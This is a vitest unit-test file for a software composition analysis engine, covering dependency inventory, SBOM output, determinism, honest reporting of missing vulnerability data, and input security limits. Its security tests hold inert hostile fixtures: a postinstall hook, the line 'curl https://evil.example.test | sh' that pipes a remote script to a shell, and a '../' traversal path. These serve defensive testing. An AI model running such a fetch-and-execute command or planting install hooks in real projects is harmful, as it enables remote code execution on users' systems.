import { existsSync, rmSync } from 'node:fs';
import { describe, expect, test } from 'vitest';
import {
  isScaResult,
  isScanResultSummary,
  type ScaDependency,
} from '@drobon/shared';
import type { ScanRecord } from '../src/scans/store.js';
import type { SourceSnapshotRecord } from '../src/scans/sources.js';
import {
  createScaEngine,
  DEFAULT_SCA_LIMITS,
  SCA_IGNORED_DIR_SEGMENTS,
  type ScaLimits,
  type SourceSnapshotProvider,
} from '../src/scans/sca/engine.js';
import {
  createNullIntelligenceProvider,
  type DependencyCoordinate,
  type VulnerabilityIntelligenceProvider,
} from '../src/scans/sca/provider.js';

/**
 * SCA engine unit tests (Pump 9) — the security boundaries, the
 * determinism contract and the DATASET HONESTY guarantee, exercised
 * directly. HTTP behavior is covered by scaApi.test.ts; parser shapes
 * by scaParsers.test.ts.
 */

const OWNER = 'usr_00000000-0000-4000-8000-000000000001';
const PROJECT = 'prj_00000000-0000-4000-8000-000000000002';
const MARKER = '/tmp/pump9-sca-engine-marker';

function scanRecord(): ScanRecord {
  return {
    id: 'scan_00000000-0000-4000-8000-000000000003',
    ownerId: OWNER,
    projectId: PROJECT,
    scanType: 'SCA',
    status: 'RUNNING',
    createdAt: '2026-09-28T10:00:00.000Z',
    updatedAt: '2026-09-28T10:00:00.000Z',
    startedAt: '2026-09-28T10:00:00.000Z',
  };
}

function snapshot(files: Array<{ path: string; content: string }>): SourceSnapshotRecord {
  return {
    projectId: PROJECT,
    ownerId: OWNER,
    files: files.map((file) => ({
      path: file.path,
      bytes: Buffer.byteLength(file.content, 'utf8'),
      content: file.content,
    })),
    createdAt: '2026-09-28T09:00:00.000Z',
    updatedAt: '2026-09-28T09:00:00.000Z',
  };
}

function providerFor(record: SourceSnapshotRecord | undefined): SourceSnapshotProvider {
  return { findByProject: async () => record };
}

const ctx = { signal: new AbortController().signal };

/** The full, realistic multi-ecosystem fixture (all four manifests). */
const FULL_SNAPSHOT = snapshot([
  {
    path: 'package.json',
    content: JSON.stringify({
      name: 'Demo-App',
      version: '2.1.0',
      // The fixture LOOKS like a vulnerable-dependency scenario on
      // purpose — the honesty test below proves no advisory appears.
      dependencies: { express: '^4.18.0', lodash: '^4.17.21' },
      devDependencies: { vitest: '^1.0.0' },
    }),
  },
  {
    path: 'package-lock.json',
    content: JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': { name: 'demo-app', version: '2.1.0', dependencies: { express: '^4.18.0', lodash: '^4.17.21' }, devDependencies: { vitest: '^1.0.0' } },
        'node_modules/express': {
          version: '4.18.2',
          integrity: 'sha512-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=',
        },
        'node_modules/lodash': { version: '4.17.21' },
        'node_modules/accepts': { version: '1.3.8' },
        'node_modules/vitest': { version: '1.2.3', dev: true },
      },
    }),
  },
  {
    path: 'requirements.txt',
    content: 'flask==2.3.2\nrequests>=2.28\n',
  },
  {
    path: 'pyproject.toml',
    content: '[project]\nname = "demo"\ndependencies = [\n  "gunicorn>=20.0",\n]\n',
  },
  {
    path: 'src/app.ts',
    content: 'export const version = 2;\n',
  },
]);

describe('SCA engine: the happy path (real dependency analysis)', () => {
  test('full multi-ecosystem snapshot → inventory, SBOM, honest summary', async () => {
    const engine = createScaEngine({ sources: providerFor(FULL_SNAPSHOT) });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed') {
      return;
    }
    const sca = outcome.sca;
    expect(sca).toBeDefined();
    if (sca === undefined) {
      return;
    }
    expect(isScaResult(sca)).toBe(true); // the whole payload is contract-valid
    expect(isScanResultSummary(outcome.resultSummary)).toBe(true);

    const summary = sca.summary;
    // npm: express, lodash, vitest (direct; vitest as dev), accepts
    // (transitive); pypi: flask, requests, gunicorn (direct).
    expect(summary.dependenciesTotal).toBe(7);
    expect(summary.directDependencies).toBe(6);
    expect(summary.transitiveDependencies).toBe(1);
    expect(summary.unclassifiedDependencies).toBe(0);
    // Python declarations have no lockfile evidence, so the whole mixed
    // inventory cannot claim a complete transitive graph.
    expect(summary.transitiveGraph).toBe('UNAVAILABLE');
    expect(summary.manifestsAnalyzed).toBe(4);
    expect(summary.truncated).toBe(false);

    const byName = new Map(sca.dependencies.map((dep) => [dep.name, dep]));
    // DECLARED vs RESOLVED are distinct and both preserved.
    expect(byName.get('express')).toMatchObject({
      declaredVersion: '^4.18.0',
      resolvedVersion: '4.18.2',
      versionSource: 'lockfile',
      dependencyClass: 'direct',
      dependencyType: 'runtime',
      lockfilePath: 'package-lock.json',
      manifestPath: 'package.json',
      integrity: 'sha512-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=',
      purl: 'pkg:npm/express@4.18.2',
    });
    expect(byName.get('accepts')?.dependencyClass).toBe('transitive');
    expect(byName.get('accepts')?.declaredVersion).toBeUndefined(); // never invented
    expect(byName.get('vitest')?.dependencyType).toBe('development');
    // requirements.txt: declared pins, NO resolved versions, direct.
    expect(byName.get('flask')).toMatchObject({
      declaredVersion: '==2.3.2',
      dependencyClass: 'direct',
      ecosystem: 'pypi',
      purl: 'pkg:pypi/flask', // no exact version → no version in the purl
    });
    expect(byName.get('flask')?.resolvedVersion).toBeUndefined();
    // pyproject: parsed alongside requirements (same ecosystem, deduped).
    expect(byName.get('gunicorn')?.manifestPath).toBe('pyproject.toml');

    // SBOM: deterministic shape, root component, direct edges.
    const sbom = sca.sbom;
    expect(sbom.bomFormat).toBe('CycloneDX');
    expect(sbom.specVersion).toBe('1.5');
    expect(sbom.metadata.component).toMatchObject({ name: 'demo-app', version: '2.1.0' });
    expect(sbom.components).toHaveLength(7);
    expect(sbom.dependencies).toHaveLength(1); // only evidenced root→direct edges
    const rootEdge = sbom.dependencies[0];
    expect(rootEdge?.dependsOn).toHaveLength(3); // only this package.json's direct deps (incl. dev)
    expect(sbom.components.find((component) => component.name === 'flask')?.version).toBe('2.3.2');
    const expressComponent = sbom.components.find((c) => c.name === 'express');
    expect(expressComponent).toMatchObject({
      version: '4.18.2',
      scope: 'required',
      purl: 'pkg:npm/express@4.18.2',
    });
    expect(expressComponent?.hashes).toEqual([
      { alg: 'SHA-512', content: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=' },
    ]);
    // dev deps map to excluded scope.
    expect(sbom.components.find((c) => c.name === 'vitest')?.scope).toBe('excluded');
  });

  test('determinism: identical snapshot → identical ids, fingerprints AND SBOM serial', async () => {
    const run = async (): Promise<ScaDependency[]> => {
      const engine = createScaEngine({ sources: providerFor(FULL_SNAPSHOT) });
      const outcome = await engine.execute(scanRecord(), ctx);
      if (outcome.kind !== 'completed' || outcome.sca === undefined) {
        throw new Error('unexpected outcome');
      }
      firstSerialHolder.serial = outcome.sca.sbom.serialNumber;
      return outcome.sca.dependencies;
    };
    const firstSerialHolder: { serial?: string } = {};
    const first = await run();
    const second = await run();
    expect(second).toEqual(first); // stable order AND stable fields
    expect(firstSerialHolder.serial).toBeDefined();
    // Dependency ids are fingerprint-derived (deterministic identity).
    for (const dependency of first) {
      expect(dependency.dependencyId).toBe(`dep_${dependency.fingerprint.slice(0, 24)}`);
      expect(dependency.dependencyId).toMatch(/^dep_[0-9a-f]{24}$/);
    }
    // A content change changes the SBOM identity (diffable, not random).
    const changed = snapshot([
      ...FULL_SNAPSHOT.files.map((f) => ({ ...f })),
    ]);
    const lock = JSON.parse(changed.files[1]?.content ?? '{}') as {
      packages: Record<string, { version: string }>;
    };
    lock.packages['node_modules/express'] = { version: '4.19.0' };
    changed.files[1] = {
      ...changed.files[1]!,
      content: JSON.stringify(lock),
    } as (typeof changed.files)[number];
    const engineChanged = createScaEngine({ sources: providerFor(changed) });
    const outcomeChanged = await engineChanged.execute(scanRecord(), ctx);
    if (outcomeChanged.kind !== 'completed' || outcomeChanged.sca === undefined) {
      throw new Error('unexpected outcome');
    }
    expect(outcomeChanged.sca.sbom.serialNumber).not.toBe(firstSerialHolder.serial);
  });

  test('requirements-only project: transitive graph is honestly UNAVAILABLE', async () => {
    const engine = createScaEngine({
      sources: providerFor(
        snapshot([{ path: 'requirements.txt', content: 'flask==2.3.2\n' }]),
      ),
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    expect(outcome.sca.summary.transitiveGraph).toBe('UNAVAILABLE');
    expect(outcome.sca.summary.unclassifiedDependencies).toBe(0); // all direct
    expect(outcome.sca.sbom.metadata.component).toBeUndefined(); // no root identity
    expect(outcome.sca.sbom.dependencies).toEqual([]); // no evidenced edges
  });

  test('package.json WITHOUT a lockfile: declared ranges only, graph UNAVAILABLE… until classified', async () => {
    const engine = createScaEngine({
      sources: providerFor(
        snapshot([
          {
            path: 'package.json',
            content: '{"name":"app","dependencies":{"lodash":"^4.0.0"}}',
          },
        ]),
      ),
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    const lodash = outcome.sca.dependencies.find((dep) => dep.name === 'lodash');
    expect(lodash).toMatchObject({
      declaredVersion: '^4.0.0',
      versionSource: 'manifest',
      dependencyClass: 'direct',
    });
    expect(lodash?.resolvedVersion).toBeUndefined(); // never fabricated
    expect(lodash?.purl).toBe('pkg:npm/lodash'); // name-only purl
    // Everything is direct (declared) — but there is NO lockfile, so
    // no transitive closure exists to report. Honest answer: UNAVAILABLE.
    expect(outcome.sca.summary.transitiveGraph).toBe('UNAVAILABLE');
    expect(outcome.sca.summary.transitiveDependencies).toBe(0);
  });

  test('lockfile v1 + companion manifest: direct/transitive from package.json', async () => {
    const engine = createScaEngine({
      sources: providerFor(
        snapshot([
          {
            path: 'package.json',
            content: '{"name":"app","dependencies":{"lodash":"^4.0.0"}}',
          },
          {
            path: 'package-lock.json',
            content: JSON.stringify({
              lockfileVersion: 1,
              dependencies: {
                lodash: { version: '4.17.21' },
                leftpad: { version: '1.3.0' },
              },
            }),
          },
        ]),
      ),
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    const byName = new Map(outcome.sca.dependencies.map((dep) => [dep.name, dep]));
    expect(byName.get('lodash')?.dependencyClass).toBe('direct');
    expect(byName.get('lodash')?.resolvedVersion).toBe('4.17.21');
    expect(byName.get('leftpad')?.dependencyClass).toBe('transitive');
  });

  test('monorepo: nested manifests in subdirectories are analyzed (path evidence kept)', async () => {
    const engine = createScaEngine({
      sources: providerFor(
        snapshot([
          { path: 'package.json', content: '{"name":"root","dependencies":{"a":"1.0.0"}}' },
          { path: 'packages/lib/package.json', content: '{"name":"@demo/lib","dependencies":{"b":"2.0.0"}}' },
        ]),
      ),
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    const b = outcome.sca.dependencies.find((dep) => dep.name === 'b');
    expect(b?.manifestPath).toBe('packages/lib/package.json');
    expect(outcome.sca.manifests.map((m) => m.path).sort()).toEqual([
      'package.json',
      'packages/lib/package.json',
    ]);
  });

  test('manifests inside ignored directories (node_modules/…) are skipped and counted', async () => {
    const engine = createScaEngine({
      sources: providerFor(
        snapshot([
          { path: 'package.json', content: '{"name":"app"}' },
          { path: 'node_modules/lodash/package.json', content: '{"name":"lodash","version":"4.17.21"}' },
          { path: 'dist/package.json', content: '{"name":"build-artifact"}' },
        ]),
      ),
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind === 'completed' && outcome.resultSummary.filesSkipped).toBe(2);
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    expect(outcome.sca.dependencies).toHaveLength(0); // no deps declared
    expect(outcome.sca.manifests).toHaveLength(1);
  });
});

describe('SCA engine: dataset honesty (the Pump 9 core guarantee)', () => {
  test('NULL provider: NOT_ASSESSED / NO_DATA_LOADED, ZERO advisories, inventory intact', async () => {
    // The fixture deliberately LOOKS vulnerable (old express/lodash).
    // Without a real loaded dataset the product MUST NOT hallucinate.
    const engine = createScaEngine({
      sources: providerFor(FULL_SNAPSHOT),
      provider: createNullIntelligenceProvider(),
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    expect(outcome.sca.summary.assessmentState).toBe('NOT_ASSESSED');
    expect(outcome.sca.summary.datasetStatus).toBe('NO_DATA_LOADED');
    expect(outcome.sca.summary.providerId).toBe('none');
    expect(outcome.sca.summary.advisoriesTotal).toBe(0);
    expect(outcome.sca.advisories).toEqual([]); // no fabricated CVE/GHSA/KEV/EPSS
    // …while the real work is all there:
    expect(outcome.sca.summary.dependenciesTotal).toBe(7);
    expect(outcome.sca.sbom.components).toHaveLength(7);
    expect(outcome.resultSummary.findingsTotal).toBe(0);
  });

  test('a REAL provider path works end-to-end (stub with a synthetic advisory)', async () => {
    // Synthetic fixtures are allowed in tests ONLY. This proves the
    // boundary is real: verified records flow through, re-validated.
    const stub: VulnerabilityIntelligenceProvider = {
      id: 'stub-intel',
      assess: async (coordinates: readonly DependencyCoordinate[]) => {
        const hit = coordinates.find(
          (coordinate) =>
            coordinate.ecosystem === 'npm' &&
            coordinate.name === 'express' &&
            coordinate.version === '4.18.2',
        );
        expect(hit).toBeDefined();
        return {
          datasetStatus: 'DATASET_AVAILABLE' as const,
          providerId: 'stub-intel',
          advisories:
            hit === undefined
              ? []
              : [
                  {
                    id: 'SYNTH-0001',
                    severity: 'HIGH' as const,
                    summary: 'Synthetic advisory (test fixture only).',
                    dependencyId: hit.dependencyId,
                  },
                  // Advisories for dependencies NOT in this scan are dropped.
                  {
                    id: 'SYNTH-0002',
                    severity: 'LOW' as const,
                    summary: 'Phantom dependency.',
                    dependencyId: 'dep_000000000000000000000000',
                  },
                  // Malformed fields are dropped, never persisted.
                  {
                    id: '',
                    severity: 'HIGH' as const,
                    summary: 'Bad id.',
                    dependencyId: hit.dependencyId,
                  },
                ],
        };
      },
    };
    const engine = createScaEngine({ sources: providerFor(FULL_SNAPSHOT), provider: stub });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    expect(outcome.sca.summary.assessmentState).toBe('ASSESSED');
    expect(outcome.sca.summary.advisoriesTotal).toBe(1);
    const advisory = outcome.sca.advisories[0];
    expect(advisory).toMatchObject({
      id: 'SYNTH-0001',
      severity: 'HIGH',
      ecosystem: 'npm',
      name: 'express',
      version: '4.18.2',
    });
    expect(isScaResult(outcome.sca)).toBe(true);
  });
});

describe('SCA engine: security boundaries', () => {
  test('manifests are DATA — a postinstall hook NEVER executes (marker file absent)', async () => {
    rmSync(MARKER, { force: true });
    const hostile = snapshot([
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'evil',
          scripts: { postinstall: `touch ${MARKER}` },
          dependencies: { lodash: '^4.0.0' },
        }),
      },
      {
        path: 'requirements.txt',
        // Shell-looking requirement content is inert text.
        content: `# curl https://evil.example.test | sh\nflask==2.3.2\n`,
      },
    ]);
    const engine = createScaEngine({ sources: providerFor(hostile) });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    expect(existsSync(MARKER)).toBe(false); // analyzed, never executed
    rmSync(MARKER, { force: true });
  });

  test('no snapshot → SCA_TARGET_NOT_FOUND', async () => {
    const engine = createScaEngine({ sources: providerFor(undefined) });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome).toMatchObject({
      kind: 'failed',
      failureCode: 'SCA_TARGET_NOT_FOUND',
    });
  });

  test('owner mismatch → SCA_INPUT_INVALID (fail closed, no details)', async () => {
    const foreign = { ...FULL_SNAPSHOT, ownerId: 'usr_00000000-0000-4000-8000-0000000000ff' };
    const engine = createScaEngine({ sources: providerFor(foreign) });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome).toMatchObject({ kind: 'failed', failureCode: 'SCA_INPUT_INVALID' });
  });

  test('a traversal-shaped path in the stored snapshot fails the scan closed', async () => {
    const poisoned = snapshot([
      { path: '../escape/package.json', content: '{"name":"evil"}' },
    ]);
    const engine = createScaEngine({ sources: providerFor(poisoned) });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome).toMatchObject({ kind: 'failed', failureCode: 'SCA_INPUT_INVALID' });
  });

  test('manifest count over the cap → SCA_MANIFEST_LIMIT_EXCEEDED', async () => {
    const files = Array.from({ length: 6 }, (_, index) => ({
      path: `pkg-${index}/package.json`,
      content: '{"name":"x"}',
    }));
    const engine = createScaEngine({
      sources: providerFor(snapshot(files)),
      limits: { maxManifests: 5 },
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome).toMatchObject({
      kind: 'failed',
      failureCode: 'SCA_MANIFEST_LIMIT_EXCEEDED',
    });
  });

  test('total manifest bytes over the cap → SCA_TARGET_TOO_LARGE', async () => {
    const big = 'x'.repeat(200_000);
    const engine = createScaEngine({
      sources: providerFor(snapshot([{ path: 'package.json', content: big }])),
      limits: { maxTotalBytes: 100_000 },
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome).toMatchObject({ kind: 'failed', failureCode: 'SCA_TARGET_TOO_LARGE' });
  });

  test('binary-looking manifests (NUL byte) are skipped and counted, not parsed', async () => {
    const engine = createScaEngine({
      sources: providerFor(
        snapshot([
          { path: 'requirements.txt', content: 'flask==1.0\n\x00binary\n' },
          { path: 'package.json', content: '{"name":"app","dependencies":{"a":"1.0.0"}}' },
        ]),
      ),
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed') {
      return;
    }
    expect(outcome.resultSummary.filesScanned).toBe(1);
    expect(outcome.resultSummary.filesSkipped).toBe(1);
    expect(outcome.sca?.manifests).toHaveLength(1);
  });

  test('deadline breach → SCA_SCAN_TIMEOUT (fake clock)', async () => {
    let tick = 1_000_000;
    const engine = createScaEngine({
      sources: providerFor(FULL_SNAPSHOT),
      limits: { deadlineMs: 10 },
      now: () => {
        tick += 1_000_000; // jump far past the deadline
        return tick;
      },
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome).toMatchObject({ kind: 'failed', failureCode: 'SCA_SCAN_TIMEOUT' });
  });

  test('aborted signal → SCA_SCAN_TIMEOUT (cooperative cancellation)', async () => {
    const controller = new AbortController();
    controller.abort();
    const engine = createScaEngine({ sources: providerFor(FULL_SNAPSHOT) });
    const outcome = await engine.execute(scanRecord(), { signal: controller.signal });
    expect(outcome).toMatchObject({ kind: 'failed', failureCode: 'SCA_SCAN_TIMEOUT' });
  });

  test('inventory over the cap: truncated with the honest total (rescan-diffable ids)', async () => {
    const packages: Record<string, unknown> = {
      '': { dependencies: { a: '1.0.0' } },
    };
    for (let index = 0; index < 25; index += 1) {
      packages[`node_modules/dep-${index}`] = { version: '1.0.0' };
    }
    const engine = createScaEngine({
      sources: providerFor(
        snapshot([
          { path: 'package.json', content: '{"name":"app","dependencies":{"a":"1.0.0"}}' },
          { path: 'package-lock.json', content: JSON.stringify({ lockfileVersion: 3, packages }) },
        ]),
      ),
      limits: { maxDependencies: 10 },
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    expect(outcome.sca.summary.truncated).toBe(true);
    expect(outcome.sca.summary.dependenciesTotal).toBe(26); // the honest total
    expect(outcome.sca.dependencies).toHaveLength(10); // the persisted bound
    expect(outcome.resultSummary.truncated).toBe(true);
    expect(isScaResult(outcome.sca)).toBe(true); // cross-field honesty holds
  });

  test('malformed manifests do NOT fail the scan — they are counted honestly', async () => {
    const engine = createScaEngine({
      sources: providerFor(
        snapshot([
          { path: 'package.json', content: '{ broken json' }, // INVALID_INPUT
          {
            path: 'pyproject.toml',
            content: '[build-system]\nrequires = ["hatchling"]', // UNSUPPORTED
          },
          { path: 'requirements.txt', content: 'flask==2.3.2\n' }, // ANALYZED
        ]),
      ),
    });
    const outcome = await engine.execute(scanRecord(), ctx);
    expect(outcome.kind).toBe('completed');
    if (outcome.kind !== 'completed' || outcome.sca === undefined) {
      return;
    }
    expect(outcome.sca.summary.manifestsAnalyzed).toBe(1);
    expect(outcome.sca.summary.manifestsInvalid).toBe(1);
    expect(outcome.sca.summary.manifestsUnsupported).toBe(1);
    expect(outcome.sca.dependencies.map((dep) => dep.name)).toEqual(['flask']);
    const invalid = outcome.sca.manifests.find((m) => m.status === 'INVALID_INPUT');
    expect(invalid?.note).toBe('Manifest is not valid JSON.'); // bounded, no content leak
  });

  test('DEFAULT_SCA_LIMITS are the documented values', () => {
    expect(DEFAULT_SCA_LIMITS).toEqual({
      maxManifests: 50,
      maxManifestBytes: 262_144,
      maxTotalBytes: 786_432,
      maxDependencies: 200,
      deadlineMs: 10_000,
    } satisfies ScaLimits);
    expect(SCA_IGNORED_DIR_SEGMENTS).toContain('node_modules');
  });
});
